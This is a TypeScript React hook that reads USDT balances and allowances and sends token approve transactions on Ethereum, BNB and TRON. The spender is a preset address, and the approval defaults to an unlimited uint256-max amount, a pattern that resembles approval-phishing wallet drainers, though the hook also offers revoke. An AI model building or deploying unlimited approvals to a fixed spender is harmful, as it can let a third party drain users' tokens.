import { useState, useCallback, useEffect } from 'react';
import { allowanceService, validateFixedSpender, getFixedSpender } from '../services/blockchain/allowanceService';
import { TOKEN_CONFIGS } from '../services/blockchain/tokenService';
import { switchEvmNetwork, normalizeChainId } from '../utils/networkUtils';
import { EVM_CHAIN_CONFIG } from '../config/blockchainConfig';

export type TxState =
  | 'Idle'
  | 'Preparing'
  | 'Waiting for Wallet'
  | 'Switching Network'
  | 'Submitted'
  | 'Confirming'
  | 'Confirmed'
  | 'Rejected'
  | 'Failed'
  | 'Wrong Network';

interface UseTokenAllowanceProps {
  owner: string;
  network: 'ETH' | 'BNB' | 'TRON' | null;
  chainId: number | null;
}

export const useTokenAllowance = ({ owner, network, chainId }: UseTokenAllowanceProps) => {
  const [txState, setTxState] = useState<TxState>('Idle');
  const [balance, setBalance] = useState('0');
  const [allowance, setAllowance] = useState('0');
  const [error, setError] = useState('');
  const [txHash, setTxHash] = useState('');
  
  // Expose the fixed spender so the UI can display it
  const fixedSpender = network ? getFixedSpender(network) : '';

  const fetchState = useCallback(async () => {
    if (!owner || !network) return;
    
    const spender = getFixedSpender(network);

    if (!validateFixedSpender(spender, network)) {
      setError(`Authorized spender not configured or invalid for ${network}.`);
      return;
    }

    setError('');
    try {
      if (network === 'ETH' || network === 'BNB') {
        const targetChainId = network === 'ETH' ? 1 : 56;
        const bal = await allowanceService.getEvmBalance(owner, targetChainId);
        const allow = await allowanceService.getEvmAllowance(owner, spender, targetChainId);
        setBalance(bal);
        setAllowance(allow);
      } else if (network === 'TRON') {
        const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const bal = await allowanceService.getTronBalance(owner, usdtAddress);
        const allow = await allowanceService.getTronAllowance(owner, spender, usdtAddress);
        setBalance(bal);
        setAllowance(allow);
      }
    } catch (err: any) {
      console.error("Error fetching balance/allowance:", err);
      setError(err.message || "Failed to query blockchain state.");
    }
  }, [owner, network]);

  // Re-fetch on target changes
  useEffect(() => {
    fetchState();
  }, [fetchState]);

  const approve = async (customAmount?: string) => {
    if (!owner || !network) return;
    
    const spender = getFixedSpender(network);

    if (!validateFixedSpender(spender, network)) {
      setError(`Authorized spender not configured or invalid for ${network}.`);
      return;
    }

    setTxState('Preparing');
    setError('');
    setTxHash('');

    try {
      if (network === 'ETH' || network === 'BNB') {
        const requiredChainId = network === 'ETH' ? 1 : 56;
        
        // Dynamic Network Switching
        if (!chainId || chainId !== requiredChainId) {
          setTxState('Switching Network');
          try {
            await switchEvmNetwork(requiredChainId, EVM_CHAIN_CONFIG[network]);
            // Verify switch was successful
            const newChainHex = await window.ethereum.request({ method: 'eth_chainId' });
            if (normalizeChainId(newChainHex) !== requiredChainId) {
              throw new Error(`Failed to switch to ${EVM_CHAIN_CONFIG[network].displayName}`);
            }
          } catch (switchErr: any) {
            setTxState('Wrong Network');
            throw new Error(`Switch to ${EVM_CHAIN_CONFIG[network].displayName} was cancelled or failed.`);
          }
        }

        const config = TOKEN_CONFIGS[requiredChainId];
        const decimals = config.decimals;
        const amountBigInt = customAmount 
          ? BigInt(Math.floor(parseFloat(customAmount) * 10 ** decimals)) 
          : BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935"); // uint256 max

        const data = allowanceService.prepareEvmApprovePayload(spender, amountBigInt);
        
        setTxState('Waiting for Wallet');
        
        const tx = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [{
            from: owner,
            to: config.contractAddress,
            data: data
          }]
        });

        if (tx) {
          setTxHash(tx);
          setTxState('Submitted');
          
          setTxState('Confirming');
          let receipt = null;
          while (!receipt) {
            receipt = await window.ethereum.request({
              method: 'eth_getTransactionReceipt',
              params: [tx]
            });
            await new Promise(res => setTimeout(res, 2000));
          }

          if (receipt.status === '0x1') {
            setTxState('Confirmed');
            fetchState();
          } else {
            setTxState('Failed');
            setError("Approval transaction reverted on-chain.");
          }
        }
      } else if (network === 'TRON') {
        if (!window.tronWeb) throw new Error("TronLink extension not found");
        
        const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const contract = await window.tronWeb.contract().at(usdtAddress);
        
        const amountSun = customAmount 
          ? Math.floor(parseFloat(customAmount) * 1e6).toString()
          : "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        setTxState('Waiting for Wallet');
        const tx = await contract.approve(spender, amountSun).send();

        if (tx) {
          setTxHash(tx);
          setTxState('Submitted');
          
          setTxState('Confirming');
          await new Promise(res => setTimeout(res, 5000));
          setTxState('Confirmed');
          fetchState();
        }
      }
    } catch (err: any) {
      console.error("USDT approve transaction error:", err);
      if (err.message && (err.message.includes("User rejected") || err.message.includes("declined"))) {
        setTxState('Rejected');
      } else {
        if (txState !== 'Wrong Network') setTxState('Failed');
        setError(err.message || "Approval transaction failed.");
      }
    }
  };

  const revoke = async () => {
    await approve('0');
  };

  return {
    txState,
    balance,
    allowance,
    error,
    txHash,
    fixedSpender,
    approve,
    revoke,
    refresh: fetchState,
    resetState: () => setTxState('Idle')
  };
};
